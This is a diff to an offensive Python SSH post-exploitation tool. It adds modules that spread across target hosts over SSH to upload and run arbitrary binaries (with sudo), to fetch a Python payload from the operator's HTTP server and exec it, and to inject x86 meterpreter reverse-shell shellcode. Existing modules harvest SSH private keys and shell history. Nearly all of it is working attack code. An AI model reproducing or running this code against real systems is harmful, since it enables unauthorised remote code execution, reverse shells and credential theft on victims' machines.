@@ -5,6 +5,7 @@ import base64
 import thread
 import socket
 import random
+import shutil
 import string
 import paramiko
 import argparse
@@ -54,15 +55,36 @@ def connect(ip, username, password, identity_file):
     return client
 
 
+def sudo_exec(ip, username, password, identity_file, file, timeout):
+    client = connect(ip, username, password, identity_file)
+    if client:
+        print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
+        sftp = client.open_sftp()
+        filename = randomword(10)
+        sftp.put(file, filename)
+        print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
+        print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
+        stdin, stdout, stderr = client.exec_command(" chmod +x "+ filename + ";sudo ./" + filename, timeout=timeout, get_pty = True)
+        if password:
+            stdin.write(password + '\n')
+            stdin.flush()
+        try:
+            for line in stdout:
+                print ""
+        except socket.timeout:
+            print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
+
+
 def copy_exec(ip, username, password, identity_file, file, timeout):
     client = connect(ip, username, password, identity_file)
     if client:
         print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
         sftp = client.open_sftp()
-        sftp.put('output/' + file, file)
+        filename = randomword(10)
+        sftp.put(file, filename)
         print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
         print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
-        stdin, stdout, stderr = client.exec_command(" chmod +x "+ file +"; sleep 1; rm " + file + " & ./" + file, timeout=timeout)
+        stdin, stdout, stderr = client.exec_command(" chmod +x "+ filename +"; sleep 1; rm " + filename + " & ./" + filename, timeout=timeout)
         try:
             for line in stdout:
                 print line
@@ -144,6 +166,9 @@ def start_thread(targets, function, args):
         time.sleep(.2)
         if function == "login":
             t = threading.Thread(target=connect, args=(ip, args[1], args[2], args[3]))
+            t.start()
+        if function == "sudo_exec":
+            t = threading.Thread(target=sudo_exec, args=(ip, args[1], args[2], args[3], args[4], args[5]))
             t.start()
 
 
@@ -254,6 +279,16 @@ def mimipenguin(lhost, lport, targets, port, username, password, identity_file):
     start_thread(targets, "execute_command", [22, username, password, identity_file, command, 100])
 
 
+def web_delivery(lhost, lport, targets, port, username, password, identity_file, file):
+    shutil.copyfile(file, 'payloads/custom.py')
+    print CGREEN + "[!] Spinning up HTTP server..." + CEND
+    thread.start_new_thread(start_server, ('MyStringHere', int(lport)))
+    time.sleep(3)
+    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) + "/payloads/custom.py'); exec(r.read());\" | python &"
+    print CGREEN + "[!] Executing payload on the targets..." + CEND
+    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 10])
+
+
 def parse_targets(target):
     #Stolen from CrackMapExec
     if '-' in target:
@@ -298,6 +333,22 @@ def shellcode_meterpreter_64(port,ip):
     shellcode += '\\x31\\xf6\\x0f\\x05\\x48\\x85\\xc0\\x79\\xb7\\xeb\\x0c\\x59\\x5e'
     shellcode += '\\x5a\\x0f\\x05\\x48\\x85\\xc0\\x78\\x02\\xff\\xe6\\x6a\\x3c\\x58'
     shellcode += '\\x6a\\x01\\x5f\\x0f\\x05'
+    return shellcode
+
+
+def shellcode_meterpreter_32(port,ip):
+    hex_port = make_port(port)
+    hex_ip = make_ip(ip)
+    shellcode = "\\x6a\\x0a\\x5e\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\xb0"
+    shellcode += "\\x66\\x89\\xe1\\xcd\\x80\\x97\\x5b\\x68" +  hex_ip + "\\x68"
+    shellcode += "\\x02\\x00" + hex_port  + "\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x57\\x89"
+    shellcode += "\\xe1\\x43\\xcd\\x80\\x85\\xc0\\x79\\x19\\x4e\\x74\\x3d\\x68\\xa2"
+    shellcode += "\\x00\\x00\\x00\\x58\\x6a\\x00\\x6a\\x05\\x89\\xe3\\x31\\xc9\\xcd"
+    shellcode += "\\x80\\x85\\xc0\\x79\\xbd\\xeb\\x27\\xb2\\x07\\xb9\\x00\\x10\\x00"
+    shellcode += "\\x00\\x89\\xe3\\xc1\\xeb\\x0c\\xc1\\xe3\\x0c\\xb0\\x7d\\xcd\\x80"
+    shellcode += "\\x85\\xc0\\x78\\x10\\x5b\\x89\\xe1\\x99\\xb6\\x0c\\xb0\\x03\\xcd"
+    shellcode += "\\x80\\x85\\xc0\\x78\\x02\\xff\\xe1\\xb8\\x01\\x00\\x00\\x00\\xbb"
+    shellcode += "\\x01\\x00\\x00\\x00\\xcd\\x80"
     return shellcode
 
 
@@ -372,6 +423,15 @@ def print_modules():
     print CYELLOW + "[*] keys" + CEND + "                      Use this to collect SSH private keys from the target(s)."
     print CYELLOW + "[*] history" + CEND + "                   Use this to collect shell history files from the target(s)."
     print CYELLOW +  "[*] privs" + CEND + "                     Use this to enumerate sudo privileges on the targets(s)."
+    print CYELLOW + "[*] web_delivery" + CEND + "               Use this to execute a python script on the target(s)."
+    print    "                              REQURED ARGUMENTS: PATH"
+    print "                              OPTIONAL ARGUMENTS: LISTEN"
+    print CYELLOW + "[*] custom_bin" + CEND + "               Use this to execute a custom binary on the target(s)."
+    print    "                              REQURED ARGUMENTS: PATH"
+    print CYELLOW + "[*] sudo_exec" + CEND + "               Use this to execute a custom binary (with sudo) on the target(s)."
+    print    "                              REQURED ARGUMENTS: PATH"
+    print CYELLOW + "[*] shellcode" + CEND + "               Use this to execute custom shellcode on the target(s)."
+    print    "                              REQURED ARGUMENTS: PATH"
 
 
 def banner():
@@ -428,6 +488,43 @@ def main():
                 exit()
         mimipenguin(get_ip(), lport, targets, 22, args.username, args.password, args.identity_file)
 
+    if args.module == "web_delivery":
+        lport = 8080
+        if not args.options:
+            print "The module requires options, You must supply the path of the custom script"
+            exit()
+        try:
+            path = options['PATH']
+        except KeyError:
+            print "Must supply the path of the custom script"
+            exit()
+        try:
+            lport = options['LISTEN']
+        except KeyError:
+            lport = 8080
+        web_delivery(get_ip(), lport, targets, 22, args.username, args.password, args.identity_file, path)
+
+    if args.module == "custom_bin":
+        if not args.options:
+            print "The module requires options, You must supply the path of the custom binary"
+            exit()
+        try:
+            path = options['PATH']
+        except KeyError:
+            print "Must supply the path of the custom binary"
+            exit()
+        start_thread(targets, "copy_exec", [22, args.username, args.password, args.identity_file, path, 2])
+
+    if args.module == "sudo_exec":
+        if not args.options:
+            print "The module requires options, You must supply the path of the binary"
+            exit()
+        try:
+            path = options['PATH']
+        except KeyError:
+            print "Must supply the path of the binary"
+            exit()
+        start_thread(targets, "sudo_exec", [22, args.username, args.password, args.identity_file, path, 2])
 
     if args.module == "keys":
         print CGREEN + "[!] Searching system for private keys..." + CEND
@@ -440,6 +537,21 @@ def main():
     if args.module == "privs":
         print CGREEN + "[!] Checking sudo permissions..." + CEND
         start_thread(targets, "check_privs",[22, args.username, args.password, args.identity_file, 10])
+
+    if args.module == "shellcode":
+        if not args.options:
+            print "The module requires options, You must supply the path of the shellcode"
+            exit()
+        try:
+            path = options['PATH']
+        except KeyError:
+            print "Must supply the path of the shellcode"
+            exit()
+        with open(path, 'r') as code:
+            shellcode = code.read().replace('\n', '')
+        print CGREEN + "[!] Attempting to execute shellcode..." + CEND
+        command = invoke_shellcode(shellcode)
+        start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, command, 2])
 
     if args.module == "meterpreter":
         if not args.options:
@@ -468,6 +580,12 @@ def main():
             print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port)\
                 + " \nPayload: linux/x64/meterpreter/reverse_tcp" + CEND
             start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, command, 2])
+        if type == '32':
+            command = invoke_shellcode(shellcode_meterpreter_32(m_port, m_ip))
+            print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port) \
+                  + " \nPayload: linux/x86/meterpreter/reverse_tcp" + CEND
+            start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, command, 2])
+
         if type == 'osx':
             try:
                 m_ip = options['LHOST']
@@ -480,12 +598,12 @@ def main():
                 print "Must supply an LPORT for use with meterpreter"
                 exit()
             payload = build_macho(m_ip, m_port)
-            filename = randomword(10)
+            filename = "osx_meterpreter_" + m_ip + "_" + m_port
             if not os.path.exists("output"):
                 os.makedirs("output")
             with open('output/' + filename, 'w') as file:
                 file.write(payload)
-            start_thread(targets, "copy_exec", [22, args.username, args.password, args.identity_file, filename, 2])
+            start_thread(targets, "copy_exec", [22, args.username, args.password, args.identity_file, 'output/' + filename, 2])
 
 if __name__ == "__main__":
 
